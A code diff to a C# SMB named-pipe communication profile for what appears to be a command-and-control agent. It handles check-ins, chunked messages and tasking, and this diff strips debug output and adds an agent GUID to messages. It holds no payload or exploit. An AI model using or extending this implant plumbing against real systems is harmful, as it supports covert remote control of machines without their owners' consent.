@@ -60,16 +60,13 @@ namespace Agent.Profiles
         public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
             //Write our checkin message to the pipe
-
             await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
 
-            Console.WriteLine("Waiting for response.");
             //Wait for a checkin response message
             checkinAvailable.Wait();
 
             //We got a checkin response, so let's finish the checkin process
             this.checkedin = true;
-
             return this.cir;
         }
 
@@ -104,7 +101,6 @@ namespace Agent.Profiles
         {
             if (!connected)
             {
-                Console.WriteLine("Waiting for client connection.");
                 onClientConnectedSignal.WaitOne();
             }
 
@@ -115,7 +111,8 @@ namespace Agent.Profiles
                 {
                     guid = Guid.NewGuid().ToString(),
                     final = false,
-                    message_type = "chunked_message"
+                    message_type = "chunked_message",
+                    agent_guid = agentConfig.uuid,
                 };
 
                 IEnumerable<string> parts = json.SplitByLength(4000);
@@ -128,7 +125,6 @@ namespace Agent.Profiles
                     {
                         sm.final = true;
                     }
-                    Console.WriteLine($"Writing message. Parts: {parts.Count()}");
                     await this.serverPipe.WriteAsync(sm);
                 }
 
@@ -155,20 +151,8 @@ namespace Agent.Profiles
                 guid = Guid.NewGuid().ToString(),
                 message_type = "success",
                 final = true,
-                delegate_message = String.Empty
-            };
-
-            await this.serverPipe.WriteAsync(sm);
-        }
-
-        private async Task SendUpdate()
-        {
-            SmbMessage sm = new SmbMessage()
-            {
-                guid = Guid.NewGuid().ToString(),
-                final = true,
-                message_type = "path_update",
-                delegate_message = this.agentConfig.uuid
+                delegate_message = String.Empty,
+                agent_guid = agentConfig.uuid,
             };
 
             await this.serverPipe.WriteAsync(sm);
@@ -231,10 +215,22 @@ namespace Agent.Profiles
             {
                 return;
             }
-
             TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
             this.SetTaskingReceived(this, tra);
             //test
+        }
+        private async Task SendUpdate()
+        {
+            SmbMessage sm = new SmbMessage()
+            {
+                guid = Guid.NewGuid().ToString(),
+                final = true,
+                message_type = "success",
+                delegate_message = "",
+                agent_guid = this.agentConfig.uuid
+            };
+
+            await this.serverPipe.WriteAsync(sm);
         }
     }
 }
